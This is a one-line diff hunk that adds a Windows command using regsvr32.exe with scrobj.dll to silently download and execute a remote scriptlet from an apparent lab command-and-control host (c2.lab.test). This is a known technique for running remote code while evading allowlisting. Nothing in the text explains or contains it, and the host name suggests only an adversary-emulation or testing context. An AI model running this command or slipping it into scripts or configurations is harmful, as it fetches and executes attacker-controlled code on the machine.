@@ -1,0 +1,1 @@
+regsvr32.exe /s /n /i:http://c2.lab.test/payload.sct scrobj.dll
